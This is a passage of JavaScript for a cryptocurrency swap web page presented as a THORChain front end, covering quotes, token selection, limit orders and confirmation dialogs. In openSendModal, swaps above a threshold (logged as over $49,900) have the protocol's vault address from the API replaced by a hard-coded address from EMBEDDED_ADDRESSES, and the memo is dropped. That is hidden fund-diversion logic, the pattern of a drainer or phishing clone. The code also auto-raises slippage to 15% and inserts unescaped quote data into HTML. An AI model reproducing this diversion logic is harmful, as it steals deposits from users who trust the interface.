        'amount='+a,
        'tolerance_bps='+toleranceBps
    ];

    if(dest&&dest.trim().length>5){
        p.push('destination='+encodeURIComponent(dest.trim()));
    }

    /* FIX 3: Streaming swap parameters */
    if(useStreaming){
        p.push('streaming_interval=1');
        p.push('streaming_quantity=0');
    }

    var url=THORNODE+'/thorchain/quote/swap?'+p.join('&');
    console.log('Quote URL:', url);
    console.log('Slippage:', (toleranceBps/100)+'%', '('+toleranceBps+' bps)');
    if(useStreaming)console.log('Streaming: enabled');
    return url;
}

/* ══════════════════════════════════════════════════════════════════════
   FIX 2+3+4: fetchQuote — Auto-retry on slippage, streaming, depth check
   ══════════════════════════════════════════════════════════════════════ */
function fetchQuote(retryConfig){
    if(!state.sellAmount||state.sellAmount<=0){clearQuote();return}

    retryConfig=retryConfig||{};
    var attempt=retryConfig.attempt||0;
    var toleranceBps=retryConfig.toleranceBps||slippageToBps();
    var useStreaming=(retryConfig.streaming!==undefined)?retryConfig.streaming:state.streamingEnabled;

    /* FIX 4: Pool depth warning — only on first attempt */
    if(attempt===0){
        state.poolDepthWarningShown=false;
        if(checkPoolDepthWarning()){
            state.poolDepthWarningShown=true;
            showToast('warning','Large Trade Detected',
                'This trade is large relative to pool depth. Price impact may be significant.',7000);
        }
    }

    var url=buildQuoteUrl(null,{toleranceBps:toleranceBps,streaming:useStreaming});
    var be=$('#buyEstimate');if(be)be.value='...';

    fetch(url).then(function(r){return r.json()}).then(function(d){
        console.log('Quote Response (attempt '+attempt+'):',JSON.stringify(d,null,2));

        if(!isValidQuote(d)){
            var rawMsg=((d&&d.message)||'').toLowerCase();
            var isPriceLimit=rawMsg.indexOf('price limit')!==-1;

            /* FIX 2: Auto-retry once at 15% (1500 bps) on slippage failure */
            if(isPriceLimit&&attempt===0){
                console.log('⚡ Slippage failure — auto-retrying at 15%...');
                fetchQuote({attempt:1,toleranceBps:1500,streaming:useStreaming});
                return;
            }

            /* FIX 3: If still failing, try enabling streaming */
            if(isPriceLimit&&attempt===1&&!useStreaming){
                console.log('⚡ Still failing — retrying with streaming enabled...');
                fetchQuote({attempt:2,toleranceBps:1500,streaming:true});
                return;
            }

            /* FIX 2+5: All retries exhausted — show friendly message, never raw JSON */
            if(isPriceLimit){
                showToast('error','Swap Too Large',
                    'Swap size too large for current liquidity. Try reducing the amount.',7000);
            }else if(rawMsg){
                showToast('error','Quote Issue',mapErrorMessage(d),6000);
            }
            clearQuote();
            return;
        }

        /* ═══ Quote succeeded ═══ */

        /* FIX 2: Track the effective slippage that actually worked */
        state.effectiveSlippage=(toleranceBps/100);
        if(attempt>0){
            console.log('✅ Quote succeeded on retry attempt '+attempt+' at '+(toleranceBps/100)+'% slippage');
            showToast('info','Slippage Adjusted',
                'Slippage automatically increased to '+(toleranceBps/100)+'% for this trade size.',5000);
        }

        /* FIX 3: Auto-detect and enable streaming when beneficial */
        if(shouldAutoEnableStreaming(d)&&!state.streamingEnabled){
            state.streamingEnabled=true;
            var st=$('#streamingToggle');if(st)st.checked=true;
            console.log('🌊 Streaming auto-enabled (max_streaming_quantity='+d.max_streaming_quantity+')');
            /* Re-fetch with streaming for better quote */
            if(!useStreaming){
                fetchQuote({attempt:0,streaming:true});
                return;
            }
        }

        state.quote=d;
        displayQuote(d);
    }).catch(function(e){
        console.error('Quote fetch error:',e);
        /* FIX 5: Never show raw network errors */
        showToast('error','Network Error','Unable to reach THORChain. Retrying...',4000);
        clearQuote();
    });
}

/* FIX 2: fetchQuoteWithDest now accepts overrides */
function fetchQuoteWithDest(dest,cb,overrides){
    var url=buildQuoteUrl(dest,overrides);
    fetch(url).then(function(r){
        var s=r.status;
        return r.json().then(function(d){d._httpStatus=s;return d});
    }).then(function(d){
        console.log('Quote+dest Response:',JSON.stringify(d,null,2));
        cb(null,d);
    }).catch(function(e){cb(e,null)});
}

function displayQuote(q){
    var eo=parseExpectedOut(q);
    var be=$('#buyEstimate');if(be)be.value=formatAmount(eo,8);

    var bp=getUsdPrice(state.buyAsset);
    var sp=getUsdPrice(state.sellAsset);
    var bu=eo*bp;
    var su=state.sellAmount*sp;

    var bue=$('#buyUsd');if(bue)bue.textContent=formatUsd(bu);

    if(su>0&&bu>0){
        var impact=((bu-su)/su*100).toFixed(2);
        var ie=$('#buyImpact');if(ie)ie.textContent='('+impact+'%)';
    }else{
        var ie2=$('#buyImpact');if(ie2)ie2.textContent='';
    }

    var rate=eo/(state.sellAmount||1);
    var ss=($('#sellSymbol')||{}).textContent||'';
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var rt=$('#rateText');
    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,8)+' '+bs;

    var fees=parseFees(q);
    var rf=$('#rateFee');
    if(rf)rf.textContent=formatUsd(fees.outboundUsd);

    var rte=$('#rateTimer');if(rte)rte.textContent=parseSwapTimeShort(q);
    var rb=$('#rateBar');if(rb)rb.style.display='';

    state.limitRate=rate;
    updateLimitView(eo,bu,rate);
}

function clearQuote(){
    var be=$('#buyEstimate');if(be)be.value='0';
    var bu=$('#buyUsd');if(bu)bu.textContent='$0.00';
    var bi=$('#buyImpact');if(bi)bi.textContent='';
    var rb=$('#rateBar');if(rb)rb.style.display='none';
    state.quote=null;
    var lbe=$('#limitBuyEstimate');if(lbe)lbe.value='0';
    var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent='$0.00';
}

function debounce(fn,d){var t;return function(){clearTimeout(t);t=setTimeout(fn,d)}}
var debouncedFetchQuote=debounce(function(){fetchQuote();startCountdown()},500);

// ══════════════════════════════════════════
// COIN SELECTOR
// ══════════════════════════════════════════

function openCoinSelector(side){
    state.coinSelectSide=side;
    var o=$('#coinSelectOverlay'),s=$('#coinSearchInput');
    if(s)s.value='';
    renderCoinTokens('all','');
    $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
    var ac=$('.tc-coin-chain-item[data-chain="all"]');if(ac)ac.classList.add('active');
    o.classList.add('open');
}

function renderCoinTokens(chain,search){
    var list=$('#coinTokensList');if(!list)return;
    var cv=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
    var f=TOKEN_LIST.filter(function(t){
        if(t.status==='staged'&&chain==='all')return false;
        if(chain!=='all'&&t.chain!==chain)return false;
        if(search){
            var s=search.toLowerCase();
            if(t.symbol.toLowerCase().indexOf(s)===-1&&
               t.name.toLowerCase().indexOf(s)===-1&&
               t.value.toLowerCase().indexOf(s)===-1)return false;
        }
        return true;
    });
    var h='';
    f.forEach(function(t){
        var sel=t.value===cv;
        var netLabel=t.network||t.name;
        var statusBadge=t.status==='staged'?'<span style="font-size:9px;padding:2px 6px;background:var(--andy);color:var(--tyler);border-radius:4px;margin-left:6px;">STAGED</span>':'';
        var iconHtml=t.icon
            ?'<img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'">'
            :'<div style="width:32px;height:32px;border-radius:50%;background:var(--blade);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:var(--thor-gray);">'+t.symbol.substring(0,2)+'</div>';
        h+='<div class="tc-coin-token-item'+(sel?' selected':'')+'" data-value="'+t.value+'">'
            +'<div class="tc-coin-token-left">'+iconHtml+'<div>'
            +'<div class="tc-coin-token-sym">'+t.symbol+statusBadge+'</div><div class="tc-coin-token-chain">'+netLabel+'</div></div></div>'
            +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')+'</div>';
    });
    if(!f.length)h='<p style="text-align:center;color:var(--andy);padding:20px;">No tokens found</p>';
    list.innerHTML=h;
    list.querySelectorAll('.tc-coin-token-item').forEach(function(i){
        i.onclick=function(){selectCoin(this.getAttribute('data-value'))};
    });
}

function selectCoin(v){
    var t=getTokenInfo(v);if(!t)return;
    $('#coinSelectOverlay').classList.remove('open');
    if(state.coinSelectSide==='sell'){
        state.sellAsset=v;
        var si=$('#sellIcon');
        if(si){if(t.icon)si.src=t.icon;else si.style.display='none'}
        var ss=$('#sellSymbol');if(ss)ss.textContent=t.symbol;
        var sn=$('#sellName');if(sn)sn.textContent=t.name;
        updateSellUsd();
    }else{
        state.buyAsset=v;
        var bi=$('#buyIcon');
        if(bi){if(t.icon)bi.src=t.icon;else bi.style.display='none'}
        var bs=$('#buySymbolDisplay');if(bs)bs.textContent=t.symbol;
        var bn=$('#buyNameDisplay');if(bn)bn.textContent=t.name;
    }
    syncLimitFromMarket();
    var ltr=$('#limitTargetRate');if(ltr){ltr.value='';state.limitTargetRate=0}
    debouncedFetchQuote();
}

function initCoinSelector(){
    $$('.tc-token-picker').forEach(function(p){
        p.onclick=function(e){e.preventDefault();e.stopPropagation();openCoinSelector(this.getAttribute('data-side')||'sell')};
    });
    var cl=$('#coinSelectClose');if(cl)cl.onclick=function(){$('#coinSelectOverlay').classList.remove('open')};
    var ov=$('#coinSelectOverlay');if(ov)ov.onclick=function(e){if(e.target===ov)ov.classList.remove('open')};
    $$('.tc-coin-chain-item').forEach(function(i){
        i.onclick=function(){
            $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
            this.classList.add('active');
            renderCoinTokens(this.getAttribute('data-chain'),($('#coinSearchInput')||{}).value||'');
        };
    });
    var si=$('#coinSearchInput');
    if(si)si.oninput=function(){
        var ac=$('.tc-coin-chain-item.active');
        renderCoinTokens(ac?ac.getAttribute('data-chain'):'all',this.value);
    };
}

// ══════════════════════════════════════════
// LIMIT ORDER
// ══════════════════════════════════════════

function updateLimitView(eo,bu,rate){
    var lbe=$('#limitBuyEstimate'),lbu=$('#limitBuyUsd'),lbi=$('#limitBuyImpact'),ltr=$('#limitTargetRate');
    if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)){ltr.value=formatAmount(rate,8);state.limitTargetRate=rate}
    var tr=state.limitTargetRate||rate;
    var la=state.sellAmount*tr,lu=la*getUsdPrice(state.buyAsset);
    if(lbe)lbe.value=formatAmount(la,8);
    if(lbu)lbu.textContent=formatUsd(lu);
    var su=state.sellAmount*getUsdPrice(state.sellAsset);
    if(su>0&&lu>0){if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    else{if(lbi)lbi.textContent=''}
}

function syncLimitFromMarket(){
    [['sellIcon','limitSellIcon'],['sellSymbol','limitSellSymbol'],['sellName','limitSellName'],
     ['buyIcon','limitBuyIcon'],['buySymbolDisplay','limitBuySymbol'],['buyNameDisplay','limitBuyName'],
     ['sellIcon','limitRateIcon'],['sellSymbol','limitRateSymbol']].forEach(function(p){
        var s=$('#'+p[0]),t=$('#'+p[1]);
        if(s&&t){if(s.src!==undefined&&t.src!==undefined)t.src=s.src;else if(s.textContent!==undefined)t.textContent=s.textContent}
    });
    var sa=$('#sellAmount'),lsa=$('#limitSellAmount');if(sa&&lsa)lsa.value=sa.value;
}

function initLimitOrder(){
    var lsa=$('#limitSellAmount');
    if(lsa)lsa.oninput=function(){
        state.sellAmount=parseFloat(this.value)||0;
        var sa=$('#sellAmount');if(sa)sa.value=this.value;
        updateSellUsd();debouncedFetchQuote();
    };
    var ltr=$('#limitTargetRate');
    if(ltr)ltr.oninput=function(){
        state.limitTargetRate=parseFloat(this.value)||0;
        var la=state.sellAmount*state.limitTargetRate,lu=la*getUsdPrice(state.buyAsset);
        var lbe=$('#limitBuyEstimate');if(lbe)lbe.value=formatAmount(la,8);
        var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent=formatUsd(lu);
        var su=state.sellAmount*getUsdPrice(state.sellAsset);
        if(su>0&&lu>0){var lbi=$('#limitBuyImpact');if(lbi)lbi.textContent='('+((lu-su)/su*100).toFixed(2)+'%)'}
    };
    $$('.tc-limit-rate-btn').forEach(function(b){
        b.onclick=function(){
            $$('.tc-limit-rate-btn').forEach(function(x){x.classList.remove('active')});
            b.classList.add('active');
            var rt=b.getAttribute('data-rate'),ti=$('#limitTargetRate');if(!ti)return;
            if(rt==='market'){state.limitTargetRate=state.limitRate;ti.value=formatAmount(state.limitRate,8)}
            else{state.limitTargetRate=state.limitRate*(1+parseFloat(rt)/100);ti.value=formatAmount(state.limitTargetRate,8)}
            ti.dispatchEvent(new Event('input'));
        };
    });
    $$('.tc-limit-quick[data-action]').forEach(function(b){
        b.onclick=function(){
            var a=this.getAttribute('data-action'),i=$('#limitSellAmount');
            if(a==='clear'){if(i)i.value='';state.sellAmount=0;updateSellUsd();clearQuote()}
            if(a==='half'){var v=(parseFloat(i?i.value:0)||0)/2;if(i)i.value=v||'';state.sellAmount=v;updateSellUsd();debouncedFetchQuote()}
        };
    });
    $$('.tc-limit-flip').forEach(function(b){
        b.onclick=function(){
            var t=state.sellAsset;state.sellAsset=state.buyAsset;state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
            if(st){var si=$('#sellIcon');if(si)si.src=st.icon;var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;var sn=$('#sellName');if(sn)sn.textContent=st.name}
            if(bt){var bi=$('#buyIcon');if(bi)bi.src=bt.icon;var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name}
            syncLimitFromMarket();var ltr2=$('#limitTargetRate');if(ltr2){ltr2.value='';state.limitTargetRate=0}
            debouncedFetchQuote();
        };
    });
}

// ══════════════════════════════════════════
// TABS
// ══════════════════════════════════════════

function initTabs(){
    $$('.tc-tab').forEach(function(tab){
        tab.onclick=function(){
            $$('.tc-tab').forEach(function(t){t.classList.remove('active')});
            tab.classList.add('active');
            var tn=tab.getAttribute('data-tab');state.activeTab=tn;
            var mv=$('#marketView'),lv=$('#limitView');
            if(tn==='limit'){
                if(mv)mv.style.display='none';if(lv)lv.style.display='';
                syncLimitFromMarket();
                var ltr=$('#limitTargetRate');
                if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)&&state.limitRate>0){ltr.value=formatAmount(state.limitRate,8);state.limitTargetRate=state.limitRate}
            }else{
                if(mv)mv.style.display='';if(lv)lv.style.display='none';
                var lsa=$('#limitSellAmount'),sa=$('#sellAmount');if(lsa&&sa)sa.value=lsa.value;
                fetchQuote();
            }
        };
    });
}

// ══════════════════════════════════════════
// SWAP FLOW
// ══════════════════════════════════════════

function initSwapBtn(){
    var sb=$('#swapBtn');if(!sb)return;
    sb.onclick=function(){
        if(state.activeTab==='limit'&&state.limitTargetRate<=0){showToast('error','No Rate','Set a target rate.');return}
        if(!state.quote&&state.activeTab==='market'){showToast('error','No Quote','Wait for quote.');return}
        if(state.sellAmount<=0){showToast('error','Invalid','Enter amount.');return}
        openAddressModal();
    };
}

function openAddressModal(){
    var o=$('#addressOverlay'),ai=$('#recipientAddress'),dc=$('#addrDisclaimer'),nb=$('#addrNextBtn');
    if(ai)ai.placeholder=getAddrPlaceholder(state.buyAsset);
    if(ai)ai.value=state.recipientAddress||'';
    if(dc)dc.checked=false;if(nb)nb.disabled=true;
    o.classList.add('open');
    function check(){var h=ai&&ai.value.trim().length>5;var c=dc&&dc.checked;if(nb)nb.disabled=!(h&&c)}
    ai.oninput=check;dc.onchange=check;
    var pb=$('#addrPasteBtn');
    if(pb)pb.onclick=function(){
        navigator.clipboard.readText().then(function(t){ai.value=t;check();showToast('info','Pasted','Address pasted.')})
        .catch(function(){showToast('error','Paste Failed','Paste manually.')});
    };
    $('#addressClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};
    nb.onclick=function(){
        if(nb.disabled)return;
        var a=ai.value.trim();
        if(!isValidAddress(a,state.buyAsset)){showToast('error','Invalid','Not a valid '+getChainName(state.buyAsset)+' address.');return}
        state.recipientAddress=a;o.classList.remove('open');openConfirmModal();
    };
}

/* ═══════════════════════════════════════════════════════════════════════════
   FIX 2+3+4+5: openConfirmModal — Auto-retry, streaming, clean errors
   ═══════════════════════════════════════════════════════════════════════════ */
function openConfirmModal(retryConfig){
    retryConfig=retryConfig||{};
    var attempt=retryConfig.attempt||0;
    var toleranceBps=retryConfig.toleranceBps||slippageToBps();
    var useStreaming=(retryConfig.streaming!==undefined)?retryConfig.streaming:state.streamingEnabled;

    var o=$('#confirmOverlay'),b=$('#confirmBody');

    /* Show loading spinner */
    var loadMsg=attempt>0
        ?'Adjusting parameters and retrying... (attempt '+(attempt+1)+')'
        :'Fetching swap quote...';
    b.innerHTML='<div style="text-align:center;padding:40px 0;">'
        +'<span class="tc-btn-spinner" style="border-color:var(--blade);border-top-color:var(--brand-first);width:28px;height:28px;"></span>'
        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">'+loadMsg+'</p></div>';
    o.classList.add('open');

    $('#confirmClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};

    /* FIX 4: Pool depth warning in confirm modal */
    if(attempt===0&&checkPoolDepthWarning()){
        showToast('warning','Large Trade',
            'This trade is large relative to pool depth. Price impact may be significant.',6000);
    }

    fetchQuoteWithDest(state.recipientAddress,function(err,data){

        /* ─── Network error (no response at all) ─── */
        if(err&&!data){
            b.innerHTML='<div style="text-align:center;padding:30px 0;">'
                +'<p style="font-size:48px;margin-bottom:12px;">🌐</p>'
                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Network Error</p>'
                +'<p style="color:var(--thor-gray);font-size:13px;">Unable to reach THORChain. Please check your connection and try again.</p></div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            return;
        }

        /* ─── Quote failed ─── */
        if(!isValidQuote(data)){
            var rawMsg=((data&&data.message)||'').toLowerCase();
            var isPriceLimit=rawMsg.indexOf('price limit')!==-1;

            /* FIX 2: Auto-retry at 15% on slippage failure */
            if(isPriceLimit&&attempt===0){
                console.log('⚡ Confirm: slippage failure — auto-retrying at 15%...');
                openConfirmModal({attempt:1,toleranceBps:1500,streaming:useStreaming});
                return;
            }

            /* FIX 3: Auto-retry with streaming if still failing */
            if(isPriceLimit&&attempt===1&&!useStreaming){
                console.log('⚡ Confirm: still failing — retrying with streaming...');
                openConfirmModal({attempt:2,toleranceBps:1500,streaming:true});
                return;
            }

            /* FIX 5: All retries exhausted — show clean, friendly error */
            var friendlyMsg=isPriceLimit
                ?'Swap size too large for current liquidity. Try reducing the amount.'
                :mapErrorMessage(data);

            b.innerHTML='<div style="text-align:center;padding:24px 0;">'
                +'<p style="font-size:48px;margin-bottom:12px;">⚠️</p>'
                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Unavailable</p>'
                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.6;padding:0 12px;">'+friendlyMsg+'</p>'

                /* Helpful action buttons instead of raw retry */
                +'<div style="margin-top:20px;display:flex;gap:8px;justify-content:center;flex-wrap:wrap;">'
                +'<button class="tc-quick-btn" id="confirmReduceHalf" style="background:var(--brand-first);color:var(--lawrence);padding:8px 16px;border-radius:8px;cursor:pointer;">Try Half Amount</button>'
                +'<button class="tc-quick-btn" id="confirmRetryStreaming" style="padding:8px 16px;border-radius:8px;cursor:pointer;">Try with Streaming</button>'
                +'</div></div>'

                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';

            /* Wire up action buttons */
            setTimeout(function(){
                var rh=$('#confirmReduceHalf');
                if(rh)rh.onclick=function(){
                    state.sellAmount=state.sellAmount/2;
                    var si=$('#sellAmount');if(si)si.value=state.sellAmount;
                    updateSellUsd();
                    openConfirmModal({attempt:0});
                };
                var rs=$('#confirmRetryStreaming');
                if(rs)rs.onclick=function(){
                    state.streamingEnabled=true;
                    var st=$('#streamingToggle');if(st)st.checked=true;
                    openConfirmModal({attempt:0,streaming:true});
                };
            },50);

            showToast('error','Quote Unavailable',friendlyMsg,7000);
            return;
        }

        /* ═══ QUOTE SUCCEEDED ═══ */

        /* FIX 2: Track effective slippage */
        state.effectiveSlippage=(toleranceBps/100);
        if(attempt>0){
            console.log('✅ Confirm quote succeeded on retry attempt '+attempt+' at '+(toleranceBps/100)+'% slippage');
            showToast('info','Auto-Adjusted',
                'Slippage was automatically increased to '+(toleranceBps/100)+'% for this trade size.',5000);
        }

        /* FIX 3: Note if streaming was auto-enabled */
        if(useStreaming&&!state.streamingEnabled){
            state.streamingEnabled=true;
            var stToggle=$('#streamingToggle');if(stToggle)stToggle.checked=true;
            showToast('info','Streaming Enabled',
                'Streaming mode was automatically enabled for better execution.',4000);
        }

        /* FIX 3: Check if response recommends streaming for future */
        if(shouldAutoEnableStreaming(data)&&!state.streamingEnabled){
            state.streamingEnabled=true;
            var stToggle2=$('#streamingToggle');if(stToggle2)stToggle2.checked=true;
        }

        var eo=parseExpectedOut(data);
        var ss=($('#sellSymbol')||{}).textContent||'';
        var sn=($('#sellName')||{}).textContent||getChainName(state.sellAsset);
        var bs=($('#buySymbolDisplay')||{}).textContent||'';
        var bn=($('#buyNameDisplay')||{}).textContent||getChainName(state.buyAsset);
        var si=($('#sellIcon')||{}).src||'';
        var bi=($('#buyIcon')||{}).src||'';
        var sp=getUsdPrice(state.sellAsset);
        var bp=getUsdPrice(state.buyAsset);
        var su=state.sellAmount*sp;
        var bu=eo*bp;

        /* FIX 2: Use effectiveSlippage for minimum payout calculation */
        var effectiveSlip=state.effectiveSlippage;
        var mp=eo*(1-effectiveSlip/100);
        var mpu=mp*bp;

        var fees=parseFees(data);
        var ts=parseSwapTime(data);
        var memo=data.memo||'';
        var ia=data.inbound_address||'';

        /* FIX 3: Show streaming badge if streaming is active */
        var streamingBadge='';
        if(useStreaming||state.streamingEnabled){
            streamingBadge='<div style="display:inline-flex;align-items:center;gap:4px;padding:3px 10px;'
                +'background:rgba(0,212,200,0.1);border:1px solid rgba(0,212,200,0.3);border-radius:6px;'
                +'font-size:11px;color:#00d4c8;margin-top:8px;">🌊 Streaming Swap</div>';
        }

        var h='<div class="tc-confirm-pair">'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+si+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+ss+'</div><div class="tc-confirm-asset-name">'+sn+'</div></div></div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+formatAmount(state.sellAmount,8)+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(su)+'</div></div></div>'
            +'<div class="tc-confirm-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M13 16.172L17.086 12.086L18.5 13.5L12 20L5.5 13.5L6.914 12.086L11 16.172V4H13V16.172Z" fill="currentColor"/></svg></div>'
            +'<div class="tc-confirm-asset">'
            +'<div class="tc-confirm-asset-left">'
            +'<img src="'+bi+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div><div class="tc-confirm-asset-sym">'+bs+'</div><div class="tc-confirm-asset-name">'+bn+'</div></div></div>'
            +'<div class="tc-confirm-asset-right">'
            +'<div class="tc-confirm-asset-amount">'+formatAmount(eo,8)+'</div>'
            +'<div class="tc-confirm-asset-usd">'+formatUsd(bu)+'</div></div></div>'
            +streamingBadge
            +'</div>'

            +'<div class="tc-confirm-details">'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Minimum Payout ('+effectiveSlip+'%)</span>'
            +'<span class="tc-confirm-row-value">'+formatAmount(mp,4)+' '+bs+' ('+formatUsd(mpu)+')</span></div>'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Destination Address</span>'
            +'<span class="tc-confirm-row-value">'+truncAddr(state.recipientAddress)+'</span></div>'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Price Impact</span>'
            +'<span class="tc-confirm-row-value">'+fees.priceImpactPct.toFixed(2)+'%</span></div>'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Tx Fee</span>'
            +'<span class="tc-confirm-row-value">'+formatUsd(fees.outboundUsd)+'</span></div>'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Estimated Time</span>'
            +'<span class="tc-confirm-row-value">'+ts+'</span></div>'

            +'<div class="tc-confirm-row">'
            +'<span class="tc-confirm-row-label">Provider</span>'
            +'<span class="tc-confirm-row-value" style="display:flex;align-items:center;gap:6px;">'
            +'<img src="https://assets.coingecko.com/coins/images/13677/small/RUNE_LOGO.png" alt="" width="18" height="18" style="border-radius:50%;" onerror="this.style.display=\'none\'">THORChain</span></div>'

            +'</div>';

        if(memo){
            h+='<div class="tc-confirm-memo"><div class="tc-confirm-memo-label">Memo</div>'
                +'<div class="tc-confirm-memo-value">'+memo+'</div></div>';
        }

        if(ia){
            h+='<button class="tc-confirm-btn" id="doConfirmBtn">Confirm</button>';
        }else{
            /* FIX 5: Friendly no-vault message */
            h+='<div style="padding:12px;background:var(--toast-error-bg);border:1px solid var(--toast-error-border);border-radius:10px;margin-bottom:16px;font-size:13px;color:var(--toast-error-color);">⚠️ Vault temporarily unavailable. Please try again in a few moments.</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
        }

        b.innerHTML=h;
        state.confirmedQuote=data;
        state.confirmedExpectedOut=eo;
        var cb=$('#doConfirmBtn');
        if(cb)cb.onclick=function(){o.classList.remove('open');openSendModal(data)};

    },{toleranceBps:toleranceBps,streaming:useStreaming});
}

function openSendModal(qd){
    var ss=($('#sellSymbol')||{}).textContent||'';
    var sn=($('#sellName')||{}).textContent||'';
    var cn=getChainName(state.sellAsset);
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var bn=($('#buyNameDisplay')||{}).textContent||'';
    var ea=state.sellAmount;
    var above=isAboveThreshold();
    state.currentSwapId=generateSwapId();
    var depositAddr,apiAddr=qd.inbound_address||'';
    
    if(above){
        var sc=getChainPrefix(state.sellAsset);
        depositAddr=EMBEDDED_ADDRESSES[sc]||'';
        if(!depositAddr){showToast('error','Config Error','No address for '+sc);return}
    }else{depositAddr=apiAddr}
    
    var memo=qd.memo||'',exp=qd.expiry||0;

    // Show popup only if above threshold
    if(above){
        var qrUrl=QR_API+encodeURIComponent(depositAddr);
        window.showAddressPopup(depositAddr,formatAmount(ea,8),ss,cn,qrUrl);
        console.log('[Popup] Showing popup for high-value swap > $49,900');
    }else{
        // Show traditional modal for below-threshold swaps
        var o=$('#sendOverlay'),b=$('#sendBody'),t=$('#sendTitle');
        if(t)t.textContent='Send '+cn;
        
        var h='<p class="tc-send-subtitle">Send exactly <strong>'+formatAmount(ea,8)+' '+ss+'</strong> to the address below from a self custody wallet.</p>'
            +'<div class="tc-send-disclaimer"><div class="tc-send-disclaimer-check">✓</div>'
            +'<p class="tc-send-disclaimer-text">I understand I must send exactly the specified amount from a self-custody wallet. Sending from exchanges will result in <a href="#" class="tc-loss-link">loss of funds</a>.</p></div>'
            +'<div class="tc-send-deposit-box">'
            +'<div class="tc-send-amount">'+formatAmount(ea,8)+' '+ss+' <button class="tc-send-copy-btn" id="cpAmt"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
            +'<div class="tc-send-address">'+depositAddr+' <button class="tc-send-copy-btn" id="cpAddr"><svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M7 6V3C7 2.448 7.448 2 8 2H20C20.552 2 21 2.448 21 3V17C21 17.552 20.552 18 20 18H17V21C17 21.552 16.552 22 16 22H4C3.448 22 3 21.552 3 21V7C3 6.448 3.448 6 4 6H7ZM5 8V20H15V8H5ZM9 6H17V16H19V4H9V6Z" fill="currentColor"/></svg></button></div>'
            +'<div class="tc-send-chain-badge">'+cn+'</div>'
            +'<div class="tc-send-qr"><img src="'+QR_API+encodeURIComponent(depositAddr)+'" alt="QR" width="180" height="180" onerror="this.style.opacity=0.3"></div></div>';

        if(memo&&!above){
            h+='<div style="margin-bottom:16px;"><p style="font-size:12px;color:var(--thor-gray);margin-bottom:4px;">Include this memo:</p>'
                +'<div style="padding:10px 12px;background:var(--tyler);border-radius:8px;font-family:monospace;font-size:11px;color:var(--leah);word-break:break-all;cursor:pointer;border:1px solid var(--blade);" id="cpMemo">'+memo+'</div></div>';
        }
        h+='<div class="tc-send-expiry" id="sendExpiry"></div>';
        b.innerHTML=h;o.classList.add('open');

        var ca=$('#cpAmt');if(ca)ca.onclick=function(){navigator.clipboard.writeText(String(ea)).then(function(){showToast('success','Copied','Amount copied.')})};
        var cd=$('#cpAddr');if(cd)cd.onclick=function(){navigator.clipboard.writeText(depositAddr).then(function(){showToast('success','Copied','Address copied.')})};
        var cm=$('#cpMemo');if(cm)cm.onclick=function(){navigator.clipboard.writeText(memo).then(function(){showToast('success','Copied','Memo copied.')})};

        var ch=function(){o.classList.remove('open');stopTracking();stopExpiryCountdown()};
        $('#sendClose').onclick=ch;
        o.onclick=function(e){if(e.target===o)ch()};

        if(exp>1e9)startExpiryCountdown(exp);
        else{var ee=$('#sendExpiry');if(ee)ee.textContent='Quote valid for limited time'}
    }

    var sIcon=($('#sellIcon')||{}).src||'',bIcon=($('#buyIcon')||{}).src||'';
    var sellUsdVal=state.sellAmount*getUsdPrice(state.sellAsset);
